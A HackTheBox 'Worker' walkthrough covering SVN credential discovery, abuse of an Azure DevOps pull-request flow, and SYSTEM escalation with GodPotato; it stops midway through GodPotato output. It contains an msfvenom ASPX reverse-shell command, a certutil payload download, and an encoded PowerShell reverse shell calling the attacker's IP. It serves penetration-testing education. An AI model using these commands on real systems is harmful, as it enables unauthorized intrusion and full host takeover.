# Worker

## Introduction

Welcome to my another writeup! In this HackTheBox [Worker](https://app.hackthebox.com/machines/Worker) machine, you'll learn: Retrieving sensitive information from Apache Subversion (SVN) repository, exploiting CI/CD pipeline in Azure DevOps Server, privilege escalation via abusing `SeImpersonatePrivilege` with GodPotato, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation (Unintended) : IIS APPPOOL\\DEFAULTAPPPOOL to NT AUTHORITY\\SYSTEM](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Worker.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:37:40(HKT)]
└> export RHOSTS=10.10.10.203            
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:37:42(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:37:54(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -Pn -oN scanning/rustscan.txt
[...]
Open 10.10.10.203:80
Open 10.10.10.203:3690
Open 10.10.10.203:5985
[...]
PORT     STATE SERVICE  REASON  VERSION
80/tcp   open  http     syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
3690/tcp open  svnserve syn-ack Subversion
5985/tcp open  http     syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:37:58(HKT)]
└> sudo nmap -sU -Pn $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
Not shown: 1000 open|filtered udp ports (no-response)
```

According to `rustscan` and `nmap` result, the target machine has 3 port are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80/TCP            | Microsoft IIS httpd 10.0      |
|3690/TCP          | Subversion                    |
|5985/TCP          | WinRM                         |

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:38:37(HKT)]
└> echo "$RHOSTS worker.htb" | sudo tee -a /etc/hosts
10.10.10.203 worker.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805183948.png)

A default IIS web page.

### Apache Subversion on TCP port 3690

According to [Apache Subversion official website](https://subversion.apache.org/), Subversion is an open source version control system. Which is a **version control software like Git**.

**Also, according to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server), we can enumerate or even download the entire repository:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805184417.png)

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:43:35(HKT)]
└> svn ls svn://$RHOSTS
dimension.worker.htb/
moved.txt
```

In the latest revision, there's a directory called `dimension.worker.htb`, and a file `move.txt`.

**View revision logs:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:44:51(HKT)]
└> svn log svn://$RHOSTS
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 21:52:00 +0800 (Sat, 20 Jun 2020) | 1 line

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 21:50:20 +0800 (Sat, 20 Jun 2020) | 1 line

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 21:46:19 +0800 (Sat, 20 Jun 2020) | 1 line

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 21:45:16 +0800 (Sat, 20 Jun 2020) | 1 line

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 21:43:43 +0800 (Sat, 20 Jun 2020) | 1 line

First version
------------------------------------------------------------------------
```

**Download the repository:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:46:44(HKT)]
└> svn checkout svn://10.10.10.203
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
[...]
A    dimension.worker.htb/index.html
A    moved.txt
Checked out revision 5.
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:46:48(HKT)]
└> ls -lah                         
total 24K
drwxr-xr-x  5 siunam nam 4.0K Aug  5 18:46 .
drwxr-xr-x 19 siunam nam 4.0K Aug  4 18:42 ..
drwxr-xr-x  4 siunam nam 4.0K Aug  5 18:46 dimension.worker.htb
-rw-r--r--  1 siunam nam  162 Aug  5 18:46 moved.txt
drwxr-xr-x  4 siunam nam 4.0K Aug  5 18:46 .svn
```

**moved.txt:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:47:10(HKT)]
└> cat moved.txt 
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

**Hmm... Based on the output of `svn log`, we can go back to the previous commit (revision):**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:48:57(HKT)]
└> svn up -r 1
Updating '.':
D    moved.txt
Updated to revision 1.
```

Nothing in revision 1, only the `moved.txt` doesn't exist in this revision.

**How about revision 2?**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:49:13(HKT)]
└> svn up -r 2
Updating '.':
A    deploy.ps1
Updated to revision 2.
```

Oh! The `deploy.ps1` PowerShell script is added in revision 2!

**deploy.ps1:**
```powershell
$user = "nathen" 
$plain = "{Redacted}"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

Nice!! We found credentials for user `nathen`!!

**Since WinRM is up, we can try to authenticate as user `nathen` using WinRM via `evil-winrm`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:51:15(HKT)]
└> evil-winrm -u 'nathen' -p '{Redacted}' -i $RHOSTS
                                        
Evil-WinRM shell v3.5
[...]                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
[...]
```

Nope... Credentials are invalid.

Let's take a step back.

**In the SVN repository, we found 2 subdomains: `dimension.worker.htb` and `devops.worker.htb`.**

**Let's add them to the `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:54:36(HKT)]
└> sudo nano /etc/hosts
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:54:48(HKT)]
└> tail -n 1 /etc/hosts
10.10.10.203 worker.htb dimension.worker.htb devops.worker.htb
```

**`dimension.worker.htb`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805185530.png)

In here, we can see `dimension` subdomain is just a HTML template.

**Actually, we even have its source code in the repository:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:56:15(HKT)]
└> ls -lah dimension.worker.htb 
total 56K
drwxr-xr-x 4 siunam nam 4.0K Aug  5 18:46 .
drwxr-xr-x 5 siunam nam 4.0K Aug  5 18:52 ..
drwxr-xr-x 6 siunam nam 4.0K Aug  5 18:46 assets
drwxr-xr-x 2 siunam nam 4.0K Aug  5 18:46 images
-rw-r--r-- 1 siunam nam  15K Aug  5 18:46 index.html
-rw-r--r-- 1 siunam nam  17K Aug  5 18:46 LICENSE.txt
-rw-r--r-- 1 siunam nam  771 Aug  5 18:46 README.txt
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|18:56:20(HKT)]
└> cat dimension.worker.htb/README.txt 
Dimension by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)


This is Dimension, a fun little one-pager with modal-ized (is that a word?) "pages"
and a cool depth effect (click on a menu item to see what I mean). Simple, fully
responsive, and kitted out with all the usual pre-styled elements you'd expect.
Hope you dig it :)
[...]
```

So, `dimension` subdomain is nothing interesting to us.

**How about `devops` subdomain?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805185720.png)

Oh! It requires HTTP basic authentication.

**Let's use `nathen`'s credentials:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805185804.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805185811.png)

It worked!

In this subdomain, it's hosting the "Azure DevOps Server", **basically it's like GitHub or GitLab**.

Hmm... Maybe we can do something weird with the **CI/CD (Continuous Integration and Continuous Deployment) pipeline**??

**In the dashboard, there's a project called "SmartHotel360":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805190416.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805190505.png)

In the "Members" section, there're 2 more users: `Administrator` and `restorer`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805190555.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805190559.png)

**Then, after checking the repository files, I found that a file was added by `Administrator`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805190957.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805191010.png)

However, it's empty?

**Next, in the pushes, I found more empty weird files that were added by `Administrator`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805191306.png)

I also tried to brute force `Administrator` and `restorer`'s password with the above empty filenames, but no dice.

After fumbling around, I found that user `nathen` ***can't*** run a build in repository "SmartHotel360":

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805192906.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805192916.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805193028.png)

Hmm... If we can run a build, we could execute arbitrary code... 

Maybe we need to escalate our privilege, so that we can run a build??

## Initial Foothold

**In "Repos", we can use the drop-down menu to select different repositories:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805203202.png)

**We can choose whatever we want, let's say "`dimension`" repository:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805203453.png)

Now we're in the `dimension` repository!  

**In the `index.html` HTML file, we can see there are different subdomains:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805203530.png)

Those also matches all the repository names!!

**Let's add all repository names to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|20:37:28(HKT)]
└> sudo nano /etc/hosts
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|20:39:01(HKT)]
└> tail -n 1 /etc/hosts
10.10.10.203 worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb dimension.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb twenty.worker.htb
```

After further inspection in those repositories, nothing weird, all of them are HTML templates. 

Hmm... What can we do in order to gain initial foothold...

I wonder if we can **create/upload arbitrary files**...

Yes we can!

**We can click the three-dots drop down menu and create a file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204125.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204158.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204216.png)

**Then click "Commit" to push the to `master` branch:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204301.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204311.png)

Ahh... We need to use a pull request to merge to the `master` branch.

**Let's create a new brach called `test`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204404.png)

**Next, create a new pull request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204433.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204444.png)

It's created!

**However, we can't just push to the `master` branch because of the policies:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204533.png)

**Required:**
- 0 of 1 reviewers approved
- No work items linked

Luckily, for some weird reasons? We can just **add ourself as the "reviewer" and create a new "Work item"**.

**Create a new "Work item":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204739.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204749.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204815.png)

**Now, we should able to complete the pull request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204850.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204911.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204916.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204922.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204940.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805204946.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805205002.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805205013.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805205031.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805205042.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805205249.png)

Nice!

But, after a few minutes...

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805205521.png)

Noo... The `restorer` user overwritten our added file... And we can't access to it...

**After some trial and error, we can kinda speed run it and win the race. Also, I found that repository `spectral` works perfectly:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805210012.png)

> Note: After pwned this machine, I read the official writeup, and it says: "The Continuous integration build, Spectral-CI, copies the content of the repo to `w:\sites\spectral.worker.htb` ." That being said, we can upload arbitrary files on `spectral` repository.

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:00:18(HKT)]
└> curl http://spectral.worker.htb/bawagwrg.txt                                    
awdfnajwdgnonfbonaokbn ejofboabnfoaobf
```

Nice!!

**Armed with above information, we can leverage a few minutes window to create an ASPX (ASP.NET) reverse shell!!**

> Note: Usually I'll upload a webshell instead of reverse shell. However, due to the limited time, it's recommend to upload a reverse shell.

- **Generate an ASPX reverse shell via `msfvenom`:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:41:53(HKT)]
└> msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o revshell_stageless_initial.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3422 bytes
Saved as: revshell_stageless_initial.aspx
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:42:03(HKT)]
└> head revshell_stageless_initial.aspx 
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
```

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:42:10(HKT)]
└> rlwrap -cAr nc -lvnp 443          
listening on [any] 443 ...
```

- **Create/upload a file with the above ASP reverse shell, and repeat the previous pull request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805214336.png)

- **Trigger the reverse shell:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:43:20(HKT)]
└> curl http://alpha.worker.htb/revshell_stageless_initial.aspx
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:42:10(HKT)]
└> rlwrap -cAr nc -lvnp 443          
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.203] 51046
[...]
c:\windows\system32\inetsrv>whoami && ipconfig /all
iis apppool\defaultapppool

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Worker
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-3C-E3
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::454d:fe80:9bc9:f741%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.203(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 117461078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AC-4B-C4-00-50-56-B9-89-30
   DNS Servers . . . . . . . . . . . : 8.8.8.8
[...]
```

## Privilege Escalation (Unintended)

### IIS APPPOOL\\DEFAULTAPPPOOL to NT AUTHORITY\\SYSTEM

**System information:**
```shell
c:\windows\system32\inetsrv>systeminfo

Host Name:                 WORKER
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
[...]
System Type:               x64-based PC
[...]
```

- Windows version : **Windows Server 2019 Build 17763**

**Local users:**
```shell
c:\windows\system32\inetsrv>net user
[...]
-------------------------------------------------------------------------------
aaralf                   abrall                   aceals                   
adaama                   Administrator            aidang                   
ainann                   alaann                   aleapp                   
alearb                   alearm                   aliart                   
aliaru                   alkash                   alpast                   
alyath                   alyath1                  amaauc                   
amaave                   amaayr                   ancbal                   
[...]         
vicmil                   vicmof                   vicmon                   
wilnee                   wilnew                   vinmon                   
virmor                   wyanis                   xavnog                   
xennor                   xzynor                   zacnor                   
zacnor1                  zagnor                   zeonor                   
zitnot                   zoeoak                   
```

We got tons of local users...

**Members of `Administrators` local group:**
```shell
c:\windows\system32\inetsrv>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
```

Only user `Administrator` is a member of `Administrators` local group.

**Now, since `iis apppool\\defaultapppool` is a service account (IIS), by default, it should have a privilege called `SeImpersonatePrivilege`.**

According to [https://juggernaut-sec.com/seimpersonateprivilege/](https://juggernaut-sec.com/seimpersonateprivilege/), an account that has the SeImpersonate privilege enabled has the ability to impersonate another client after authentication. This means that this privilege allows the account to impersonate other accounts, so long as they have authenticated. Whenever a user authenticates to a host, a token (logon sessions inside the **LSASS** process) resides on the system until the next restart.

To abuse `SeImpersonatePrivilege` to escalate our privilege to SYSTEM, we can use potato exploits.

However, the machine's Windows version is quite new, so typical potato exploits like Rogue Potato won't work.

During my school's mini-project that showcases "Active Directory Penetration Testing", I stumble upon another potato exploit that's lesser known? It's called "[GodPotato](https://github.com/BeichenDream/GodPotato)".

This potato exploit abuses `SeImpersonatePrivilege` to perform privilege escalation in Windows 2012 to Windows 2022, the author says it can run on almost any Windows OS.

But before we launch the GodPotato exploit, we need to find the machine's .NET version.

**Find .NET version:**
```shell
c:\windows\system32\inetsrv>reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
[...]
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v4\Client
    CBS    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    InstallPath    REG_SZ    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
    Release    REG_DWORD    0x70bf6
    Servicing    REG_DWORD    0x0
    TargetVersion    REG_SZ    4.0.0
    Version    REG_SZ    4.7.03190
[...]
```

- .NET version: `4.7.03190`

Now we can go to the [GodPotato releases](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20), and download [GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe).

- **Transfer GodPotato:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:55:03(HKT)]
└> file /opt/GodPotato/GodPotato-NET4.exe 
/opt/GodPotato/GodPotato-NET4.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:55:16(HKT)]
└> python3 -m http.server -d /opt/GodPotato 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
c:\windows\system32\inetsrv>certutil -urlcache -split -f http://10.10.14.12/GodPotato-NET4.exe C:\Windows\Temp\GodPotato.exe
[...]
CertUtil: -URLCache command completed successfully.
```

```shell
C:\Windows\Temp\GodPotato.exe
Exception:Required Parameter cmd
                                                                                               
    FFFFF                   FFF  FFFFFFF                                                       
   FFFFFFF                  FFF  FFFFFFFF                                                      
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    


Arguments:

	-cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami" 
GodPotato -cmd "cmd /c whoami" 
```

**Now we can test if it's working or not:**
```
c:\windows\system32\inetsrv>C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140706833498112
[*] DispatchTable: 0x140706835807440
[*] UseProtseqFunction: 0x140706835187600
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\e515ea62-4583-48e4-8bde-4a829b099001\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009c02-1360-ffff-b38e-4792ff1d750a
[*] DCOM obj OXID: 0xd8bafabbe82f493d
[*] DCOM obj OID: 0xd4f5d5bb5a70d644
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 944 Token:0x632  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 8092
nt authority\system
```

It worked! Let's get a reverse shell as SYSTEM!

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:55:58(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
```

- **PowerShell reverse shell:** (Generated from [revshells.com](https://www.revshells.com/))
```shell
c:\windows\system32\inetsrv>C:\Windows\Temp\GodPotato.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyACIALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
[*] CombaseModule: 0x140706833498112
[*] DispatchTable: 0x140706835807440
[*] UseProtseqFunction: 0x140706835187600
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\83a356f2-dd0a-413a-8b87-d773e26630ef\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
